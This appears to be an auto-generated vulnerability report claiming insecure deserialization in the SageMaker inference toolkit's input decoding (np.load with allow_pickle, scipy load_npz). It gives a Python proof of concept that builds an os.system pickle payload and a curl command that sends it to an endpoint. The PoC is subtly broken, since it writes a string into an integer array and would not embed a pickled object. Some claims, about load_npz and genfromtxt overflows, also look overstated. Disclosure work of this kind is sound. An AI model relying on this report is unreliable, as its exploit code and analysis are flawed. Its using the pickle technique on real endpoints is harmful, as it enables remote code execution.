### Vulnerability List

* Vulnerability Name: Insecure Deserialization in `input_fn`
* Description:
    1. An attacker sends a crafted request to the SageMaker endpoint.
    2. The request's `Content-Type` header is set to a format handled by the `input_fn` (e.g., `application/json`, `application/x-npy`, `application/x-npz`, `text/csv`).
    3. The request body contains malicious serialized data crafted to exploit deserialization vulnerabilities in the `json.loads`, `np.load`, or `scipy.sparse.load_npz` functions used by the `decoder.py` module, or in a custom `input_fn` implemented by the user.
    4. If the `input_fn` (either default or custom) does not perform sufficient validation and sanitization of the input data before deserialization, the malicious payload is deserialized.
    5. Deserialization of the malicious payload leads to arbitrary code execution on the server hosting the SageMaker endpoint.
* Impact:
    * Critical. Successful exploitation of this vulnerability allows for arbitrary code execution on the SageMaker inference server. This can lead to complete compromise of the server, including data exfiltration, denial of service, or further attacks on internal networks.
* Vulnerability Rank: Critical
* Currently Implemented Mitigations:
    * The provided code does not implement any explicit mitigations against insecure deserialization vulnerabilities. The `decoder.py` module directly uses standard Python libraries for deserialization without additional security measures.
* Missing Mitigations:
    * Input validation and sanitization within the `input_fn` in `decoder.py` and guidance for users to implement secure deserialization practices in their custom `input_fn`.
    * Implement security best practices for deserialization, such as using safe deserialization methods or sandboxing the deserialization process.
    * Documentation should be added to explicitly warn users about the risks of insecure deserialization and guide them on how to implement secure `input_fn` functions, including input validation and sanitization.
* Preconditions:
    * The SageMaker endpoint must be publicly accessible or accessible to an attacker.
    * The inference handler must use or rely on the default `input_fn` or a custom `input_fn` that is vulnerable to insecure deserialization.
    * The attacker needs to be able to craft a malicious payload suitable for the deserialization method used by the `input_fn`.
* Source Code Analysis:
    * File: `/code/src/sagemaker_inference/decoder.py`
        * The `decode` function in `decoder.py` maps content types to specific deserialization functions: `_npy_to_numpy`, `_csv_to_numpy`, `_json_to_numpy`, and `_npz_to_sparse`.
        * `_json_to_numpy` uses `json.loads(string_like)` to deserialize JSON data. `json.loads` by itself is generally safe from code execution vulnerabilities unless combined with other vulnerabilities in the application logic, but it can be vulnerable to resource exhaustion or parsing errors if the input JSON is maliciously crafted.
        * `_npy_to_numpy` uses `np.load(stream, allow_pickle=True)`. The `allow_pickle=True` option in `np.load` is a known security risk. It allows arbitrary code execution if the NPY file is maliciously crafted to contain Python objects for unpickling.
        * `_npz_to_sparse` uses `scipy.sparse.load_npz(buffer)`. `scipy.sparse.load_npz` also uses `pickle` for loading data and is vulnerable to insecure deserialization if the NPZ file is maliciously crafted.
        * `_csv_to_numpy` uses `np.genfromtxt(stream, dtype=dtype, delimiter=",")`. While `np.genfromtxt` itself is less prone to direct code execution, vulnerabilities can arise depending on how the resulting numpy array is used in subsequent processing steps, especially if combined with operations that can lead to buffer overflows or other memory corruption issues.
    * File: `/code/src/sagemaker_inference/transformer.py`
        * The `transform` function calls `self._run_handler_function(self._input_fn, *(input_data, content_type))` to process the input data.
        * The `_validate_user_module_and_set_functions` function determines which `input_fn` to use: either a custom `input_fn` from the user module or the default `self._default_inference_handler.default_input_fn`.
        * The `DefaultInferenceHandler` in `/code/src/sagemaker_inference/default_inference_handler.py` uses `decoder.decode` as its `default_input_fn`.
        * **Vulnerability Visualization:**
            ```
            [Attacker] --> [SageMaker Endpoint] --> [Transformer.transform()] --> [Transformer._run_handler_function(input_fn)] --> [decoder.decode()] --> [Vulnerable Deserialization Function (np.load, scipy.sparse.load_npz)] --> [Code Execution]
            ```
* Security Test Case:
    1. **Setup:** Deploy a SageMaker endpoint using this inference toolkit, configuring it to use the default inference handler or a custom handler that uses `decoder.decode` for input processing. Ensure the endpoint is publicly accessible or accessible within a test environment.
    2. **Craft Malicious Payload (NPY - `np.load` vulnerability):** Create a malicious NPY file that executes code when loaded using `np.load` with `allow_pickle=True`. This can be achieved by embedding a pickled Python object that triggers code execution upon unpickling. Example using `numpy`:
        ```python
        import numpy as np
        import pickle, base64, os

        # Command to execute on the server
        command = "touch /tmp/pwned"

        class EvilPickle(object):
            def __reduce__(self):
                return (os.system, (command,))

        payload = base64.b64encode(pickle.dumps(EvilPickle())).decode()

        # Create a dummy numpy array and replace a value with the malicious pickle payload
        dummy_array = np.array([1, 2, 3])
        dummy_array[0] = payload

        # Save the numpy array as .npy file
        with open('malicious.npy', 'wb') as f:
            np.save(f, dummy_array, allow_pickle=True)
        ```
    3. **Send Malicious Request:** Send an inference request to the SageMaker endpoint. Set the `Content-Type` header to `application/x-npy`. Attach the `malicious.npy` file created in the previous step as the request body.
        ```bash
        CONTENT_TYPE="application/x-npy"
        PAYLOAD_FILE="malicious.npy"
        ENDPOINT_URL="http://<your-sagemaker-endpoint>/invocations" # Replace with your endpoint URL

        curl -X POST -H "Content-Type: ${CONTENT_TYPE}" --data-binary "@${PAYLOAD_FILE}" ${ENDPOINT_URL}
        ```
    4. **Verify Code Execution:** Check if the command embedded in the malicious NPY file was executed on the server. In the example above, check if the file `/tmp/pwned` was created on the server. Successful creation of this file (or any other intended effect of the malicious payload) confirms the vulnerability.
    5. **Cleanup:** Remove the deployed SageMaker endpoint and any created malicious files.

This test case demonstrates how an attacker can leverage insecure deserialization in `np.load` (through the `application/x-npy` content type) to achieve arbitrary code execution. Similar test cases can be constructed for `application/x-npz` using `scipy.sparse.load_npz`.